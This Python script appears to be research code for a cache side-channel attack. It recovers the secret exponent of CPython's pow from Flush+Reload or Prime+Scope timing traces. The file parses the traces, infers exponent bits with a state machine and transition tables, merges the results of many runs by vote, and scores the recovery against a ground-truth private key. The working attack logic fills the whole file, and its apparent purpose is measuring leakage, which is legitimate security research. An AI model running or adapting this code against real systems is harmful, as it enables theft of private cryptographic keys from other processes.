import argparse
import glob
import os
from collections import Counter
import pandas as pd
import numpy as np

from utils import load_trace, lat_to_hit, progress

CONSUME_ZERO = 0
WINDOW = 1
TRAILING = 2
GAP = -1

attack_type = "FR"
acc_threshold = 0.75
key_path = None
COMSUME_ZEROS_DUP_INTERVAL = 40000


def run_state_machine(hits):
    counters = []
    prev = None
    ctr = 0
    skipped = 0

    i = 0
    while i < len(hits):
        hit = hits[i]
        i += 1

        if prev is None and (hit[TRAILING] or (hit[CONSUME_ZERO] and hit[WINDOW])):
            continue

        if not any(hit):
            skipped += 1
            continue

        if hit[CONSUME_ZERO] and not hit[WINDOW]:
            if prev is WINDOW:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0
                prev = TRAILING

            if prev is TRAILING:
                counters.append((TRAILING, ctr))
                ctr = 0
                skipped = 0

            prev = CONSUME_ZERO
            ctr += 1

        elif hit[WINDOW]:
            if prev is WINDOW and ctr + skipped >= 10:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0
                prev = TRAILING

            if prev is TRAILING:
                counters.append((TRAILING, ctr))
                ctr = 0
                skipped = 0
                prev = CONSUME_ZERO

            if prev in [None, CONSUME_ZERO]:
                counters.append((CONSUME_ZERO, ctr))
                ctr = 0
                skipped = 0

            prev = WINDOW
            ctr += 1

        elif hit[TRAILING]:
            if prev is CONSUME_ZERO:
                counters.append((CONSUME_ZERO, ctr))
                ctr = 0
                skipped = 0
                prev = WINDOW

            if prev is WINDOW:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0

            prev = TRAILING
            ctr += 1

    return counters


def strip_preamble(hits):
    i = 0
    while i < len(hits) and not (
        hits[i][CONSUME_ZERO] and hits[i][WINDOW] and hits[i][TRAILING]
    ):
        i += 1
    hits = hits[i + 2 :]

    i = len(hits) - 1
    while i > 2 and not (any(hits[i])):
        i -= 1
    return hits[:i]


def parse_trace(file):
    hits = []
    with open(file) as f:
        lines = f.read().strip().splitlines()

    for line in lines:
        hit = []
        entries = line.strip().split()

        for entry in entries:
            lat = int(entry.split(":")[1])
            hit.append(lat_to_hit(lat, attack_type))

        hits.append(hit)

    return run_state_machine(strip_preamble(hits))


def parse_trace_PS(filepath):
    df = load_trace(filepath)

    mapping = {0: "CZ", 1: "AW", 2: "AT"}
    # 0: Comsume_Zeros
    # 1: Absorb_Window
    # 2: Absorb_Trailing

    hits = []
    for col in df.columns:
        tmp = pd.DataFrame(df[col].tolist(), columns=["tsc", "lat"])
        tmp["src"] = mapping[col]
        hits.append(tmp)

    cache_hits = pd.concat(hits, ignore_index=True)
    cache_hits = cache_hits[~((cache_hits["tsc"] == 0) & (cache_hits["lat"] == 0))]
    cache_hits = (
        cache_hits.drop(columns=["lat"]).sort_values("tsc").reset_index(drop=True)
    )

    return cache_hits


def merge_traces(size, files):
    merged = [Counter() for i in range(size)]

    for file in files:
        trace = parse_trace(file)
        for i, ctr in enumerate(trace):
            merged[i][ctr[1]] += 1

    return merged


def infer_FR(merged, nr):
    inf = []

    p = 0
    while True:
        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer zeroes
        zeroes = max(merged[p], key=merged[p].get)
        # zconfidence = merged[p][zeroes] / nr
        # print("Infer", zeroes, "zeroes, confidence:", zconfidence)
        for i in range(zeroes):
            inf.append(0)
        p += 1

        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer reduced window
        reduced = max(merged[p], key=merged[p].get)
        wconfidence = merged[p][reduced] / nr
        reduced = max(reduced, 1)
        # assert 1 <= reduced <= 5
        p += 1

        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer trailing
        trailing = max(merged[p], key=merged[p].get)
        tconfidence = merged[p][trailing] / nr
        # assert trailing < 5
        p += 1

        if reduced + trailing != 5:
            # print("Adapting window based on confidence")
            if wconfidence > tconfidence:
                trailing = 5 - min(reduced, 5)
            else:
                reduced = 5 - min(trailing, 5)

        # print("Infer", reduced, "- reduced window, confidence:", wconfidence)
        inf.append(1)
        for i in range(reduced - 2):
            inf.append(-1)
        if reduced > 1:
            inf.append(1)

        # print("Infer", trailing, "- trailing zeroes, confidence:", tconfidence)
        for i in range(trailing):
            inf.append(0)

    return inf


gt = []


def check_inf_match(inf):
    global gt
    ret = True
    mb = 0
    for idx, bits in enumerate(inf):
        if bits == "1" and not gt[idx] == "1":
            if not mb:
                mb = idx
            ret = False
        if bits == "0" and not gt[idx] == "0":
            if not mb:
                mb = idx
            ret = False
    if not ret:
        print("".join(inf), "".join(gt[: len(inf)]), mb, sep="\n")
    return ret


def parse_PS_window(seg, window_start, window_size):
    tsc = seg["tsc"].values
    src = seg["src"].values

    print("Window:")
    window_end = window_start
    while window_end < len(tsc) and tsc[window_end] - tsc[window_start] < window_size:
        print(tsc[window_end], src[window_end])
        window_end += 1
    return window_end


def get_next_state(current_state, trigger, ratio=0.2):
    print("get_next_state:", current_state, trigger)
    transition_table = {}

    transition_table[(("", 0), "CZ")] = (150000, ("CZ", 1))
    transition_table[(("", 0), "AW")] = (150000, ("AW", 1))

    transition_table[(("CZ", 1), "CZ")] = (150000, ("CZ", 1))
    transition_table[(("CZ", 1), "AW")] = (150000, ("AW", 1))

    for i in range(1, 5):
        transition_table[(("AW", i), "AT")] = (300000, ("AT", i + 1))
        transition_table[(("AW", i), "AW")] = (150000, ("AW", i + 1))

    for i in range(2, 5):
        transition_table[(("AT", i), "AT")] = (150000, ("AT", i + 1))

    transition_table[(("AW", 5), "AW")] = (300000, ("AW", 1))
    transition_table[(("AW", 5), "CZ")] = (300000, ("CZ", 1))
    transition_table[(("AT", 5), "AW")] = (150000, ("AW", 1))
    transition_table[(("AT", 5), "CZ")] = (150000, ("CZ", 1))

    # from pprint import pprint
    # pprint(transition_table)

    trigger_name, trigger_value = trigger
    entry = transition_table.get((current_state, trigger_name))
    if entry is None:
        return None, None

    center, next_state = entry
    if center * (1 - ratio) <= trigger_value <= center * (1 + ratio):
        return next_state, abs(trigger_value - center)

    return None, None


def resolve_bits(current_state, next_state, diff):
    print(current_state, next_state, diff)
    bits_table = {
        (("", 0), ("CZ", 1)): "",
        (("", 0), ("AW", 1)): "",
        (("CZ", 1), ("CZ", 1)): "0",
        (("CZ", 1), ("AW", 1)): "0",
        (("AW", 1), ("AW", 2)): "",
        (("AW", 2), ("AW", 3)): "",
        (("AW", 3), ("AW", 4)): "",
        (("AW", 4), ("AW", 5)): "",
        (("AW", 1), ("AT", 2)): "1",
        (("AW", 2), ("AT", 3)): "11",
        (("AW", 3), ("AT", 4)): "1?1",
        (("AW", 4), ("AT", 5)): "1??1",
        (("AW", 5), ("CZ", 1)): "1???1",
        (("AW", 5), ("AW", 1)): "1???1",
        (("AT", 2), ("AT", 3)): "0",
        (("AT", 3), ("AT", 4)): "0",
        (("AT", 4), ("AT", 5)): "0",
        (("AT", 5), ("AW", 1)): "0",
        (("AT", 5), ("CZ", 1)): "0",
    }

    return bits_table.get((current_state, next_state))


def infer_PS(seg, pre_counts=None):
    inf = ""

    tsc = seg["tsc"].values
    src = seg["src"].values

    start_window = 15000
    start_idx = 0
    count = {"CZ": 0, "AW": 0, "AT": 0}

    for r in range(len(tsc)):
        count[src[r]] += 1

        while tsc[r] - tsc[start_idx] > start_window:
            count[src[start_idx]] -= 1
            start_idx += 1

        if all(v > 0 for v in count.values()):
            break

    print(seg)
    start_end = start_idx
    while tsc[start_end] - tsc[start_idx] < start_window:
        start_end += 1

    pos = start_end
    consec_window = 60000
    w_cnt = 0

    # Resolve the trailing zeros in the first window
    while pos < len(seg):
        c_tsc, c_src = seg.iloc[pos]
        if c_src == "AT":
            n_pos = pos
            w_cnt = 1
            expect_src = "AT"
            while True:
                n_pos += 1
                n_tsc, n_src = seg.iloc[n_pos]
                print(n_tsc, n_src)
                if n_src == expect_src:
                    if n_tsc - c_tsc > consec_window:
                        w_cnt += 1
                    c_tsc, c_src = seg.iloc[n_pos]
                    continue
                else:
                    print(w_cnt)
                    inf += "1"
                    inf += "?" * (3 - w_cnt)
                    if w_cnt <= 3:
                        inf += "1"
                    inf += "0" * w_cnt
                    pos = n_pos
                    break
        else:
            inf = "1???1"
        break

    print("First window: ", inf)

    # Remaining Windows

    state = ("", 0)
    # FIXME: hardcoded window size
    window_size = 600000
    count = dict(pre_counts) if pre_counts else {"CZ": 0, "AW": 0, "AT": 0}

    for i in range(pos):
        count[src[i]] += 1

    # pos: the index of cache hit to check
    # lw_idx: last chosen hit index
    # nw_idx: next chosen hit index

    while pos < len(seg):
        print("New Group starting from:")
        print(tsc[pos], src[pos], "Index", count[src[pos]])

        lw_idx = pos - 1
        n_pos = pos
        while n_pos < len(tsc) and tsc[n_pos] - tsc[pos] < window_size:
            n_pos += 1

        ns_list = []  # [(next_state, nw_idx, diff), ...]
        for idx in range(pos, n_pos):
            n_state, diff = get_next_state(state, (src[idx], tsc[idx] - tsc[lw_idx]))
            if n_state:
                ns_list.append((n_state, idx, diff))

        # NOTE(heuristics): CZ AW Speculation
        ns_states = {s for s, _, _ in ns_list}

        if ns_states == {("CZ", 1), ("AW", 1)}:
            ns_list = [(s, i, d) for s, i, d in ns_list if s == ("AW", 1)]
        elif ns_states == {("AW", 3), ("AT", 3)}:
            ns_list = [(s, i, d) for s, i, d in ns_list if s == ("AW", 3)]

        ns_states = {s for s, _, _ in ns_list}
        if len(ns_states) > 0:
            n_state, nw_idx, diff = min(ns_list, key=lambda x: x[2])

            bits = resolve_bits(state, n_state, tsc[nw_idx] - tsc[lw_idx])
            state = n_state
            for i in range(pos, nw_idx + 1):
                count[src[i]] += 1
            pos = nw_idx + 1
            if bits == None:
                print("???")
            inf += bits
            if not check_inf_match(inf):
                print("Mismatch")
            print("Infer Length " + str(len(inf)), inf, "\n", sep="\n")
        elif len(ns_states) == 0:
            print("Ignore Mismatch Pattern")
            # count[src[pos]] += 1
            pos += 1
            break
        else:
            print("?", ns_states)
            return

    return inf


def find_str_offset(d, inf):
    l = len(d)
    offset = 5
    while offset < l:
        if d[offset] == 1:
            break
        offset += 1

    i = 0
    while i < offset:
        if inf[i] == 1:
            break
        i += 1

    return offset - i


def collect_metrics(d, inf, size):
    recoverable = 0
    recoverable_leading = 0
    masked = []
    i = 0
    l = len(d)
    offset = 0
    recovered = 0
    correct = 0
    first_failure = 0
    end_window = 0
    while i < l:
        if d[i] == 0:
            recoverable_leading += 1
            i += 1
            masked.append(0)
            continue

        t = 0
        end = min(l - 1, i + 4)
        while end > i:
            if d[end] == 1:
                break
            recoverable += 1
            end -= 1
            t += 1

        s = end - i + 1
        recoverable += min(s, 2)
        i += s + t

        masked.append(1)
        for j in range(s - 2):
            masked.append(-1)
        if s > 1:
            masked.append(1)
        for j in range(t):
            masked.append(0)

        if i == l:
            end_window = s + t

    for o in range(15):
        correct = 0
        first_failure = 0
        recovered = 0
        for i, (x, y) in enumerate(zip(d[o:], inf)):
            if y != -1:
                recovered += 1
                if x == y:
                    correct += 1
                elif first_failure == 0 and y >= 0:
                    first_failure = i
        offset = o
        if correct / (recoverable + recoverable_leading) > acc_threshold:
            break

    return {
        "Sample Size": size,
        "Bits": len(inf),
        "Offset": offset,
        "Recovered": recovered,
        "Correct": correct,
        "Accuracy": correct / l,
        "Relative Accuracy (incl. leading and trailing)": correct
        / (recoverable + recoverable_leading),
        "Inference Accuracy (excl leading and trailing)": correct
        / (recoverable + recoverable_leading - end_window - o),
        "First Failure": first_failure,
    }


def merge_inferences(inf_list, target_len):
    result = []
    for i in range(target_len):
        v0 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == 0)
        v1 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == 1)
        if v1 > v0:
            result.append(1)
        elif v0 > v1:
            result.append(0)
        else:
            result.append(-1)
    return result


def extract_FR(folder):
    with open(key_path or f"{folder}/private.key") as f:
        keys = f.read().strip()
        d = list(map(int, keys[2:]))

    files = glob.glob(f"{folder}/*.out")

    merged = [Counter() for i in range(len(d))]
    metrics = []

    task = progress.add_task("[green]Processing traces...", total=len(files))
    prev = 0
    next = 1
    while next <= len(files):
        for i in range(prev, next):
            trace = parse_trace(files[i])
            for j, ctr in enumerate(trace):
                merged[j][ctr[1]] += 1
            progress.update(task, advance=1)

        inf = infer_FR(merged, next)

        # offset = find_str_offset(d, inf)
        # print("Exponent:", "".join([str(x) for x in d]))
        # s = "Inferred: " + " " * offset
        # for i in inf:
        #     if i == -1:
        #         s += "_"
        #     else:
        #         s += str(i)
        # print(s)

        m = collect_metrics(d, inf, next)
        # print(m)
        metrics.append(m)

        prev = next
        next = 2 * next

    progress.remove_task(task)
    return metrics


def parse_trace_segment(cache_hits, k=4):
    tsc = cache_hits["tsc"].values
    diff = np.diff(tsc)

    d50 = np.percentile(diff, 50)
    d99 = np.percentile(diff, 99)
    thres = d50 * k
    print(d50, d99, thres)
    split_idx = np.where(diff > thres)[0]

    segments = np.split(tsc, split_idx + 1)
    print(list(map(len, segments)))
    target_range = max(segments, key=len)
    low, high = target_range[0], target_range[-1]
    print(low, high)
    core_seg = cache_hits[
        (cache_hits["tsc"] >= low) & (cache_hits["tsc"] <= high)
    ].reset_index(drop=True)
    pre = cache_hits[cache_hits["tsc"] < low]["src"].value_counts().to_dict()
    pre_counts = {k: pre.get(k, 0) for k in ("CZ", "AW", "AT")}
    return core_seg, pre_counts


def process_PS_file(filepath):
    hits = parse_trace_PS(filepath)
    core_segment, pre_counts = parse_trace_segment(hits)
    return infer_PS(core_segment, pre_counts)


def extract_PS(folder):
    with open(key_path or f"{folder}/private.key") as f:
        keys = f.read().strip()
        d = list(map(int, keys[2:]))
        global gt
        gt = list(keys[2:])
        print(keys)

    files = glob.glob(f"{folder}/*.out")

    all_infs = []
    metrics = []

    task = progress.add_task("[green]Processing traces (PS)...", total=len(files))
    next_metric_at = 1

    for file_idx, filepath in enumerate(files, 1):
        inf = process_PS_file(filepath)

        if inf:
            all_infs.append(inf)
        progress.update(task, advance=1)

        if file_idx == next_metric_at and all_infs:
            merged_inf = merge_inferences(all_infs, len(d))
            m = collect_metrics(d, merged_inf, file_idx)
            metrics.append(m)
            next_metric_at *= 2

    progress.remove_task(task)
    return metrics


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret exponent from cpython pow trace"
    )

    parser.add_argument(
        "-d",
        "-f",
        dest="path",
        type=str,
        required=True,
        help="Folder containing private.key and *.out traces, or a single *.out file",
    )

    parser.add_argument(
        "-k",
        "--key",
        type=str,
        default=None,
        help="Path to private.key file (default: <folder>/private.key)",
    )

    parser.add_argument(
        "--at",
        choices=["FR", "PS"],
        default="FR",
        help="Attack primitive: FR (Flush+Reload) or PS (Prime+Scope) (default: FR)",
    )

    parser.add_argument(
        "--threshold",
        type=float,
        default=0.75,
        help="Accuracy threshold for offset alignment (default: 0.75)",
    )

    args = parser.parse_args()

    attack_type = args.at
    acc_threshold = args.threshold
    key_path = args.key

    if os.path.isfile(args.path):
        folder = os.path.dirname(os.path.abspath(args.path))
        kfile = key_path or os.path.join(folder, "private.key")
        if os.path.exists(kfile):
            with open(kfile) as f:
                keys = f.read().strip()
            gt = list(keys[2:])
        if attack_type == "PS":
            with progress:
                inf = process_PS_file(args.path)
            print(inf)
    else:
        if attack_type == "FR":
            with progress:
                metrics = extract_FR(args.path)
            for m in metrics:
                print(m)
        elif attack_type == "PS":
            with progress:
                metrics = extract_PS(args.path)
            for m in metrics:
                print(m)
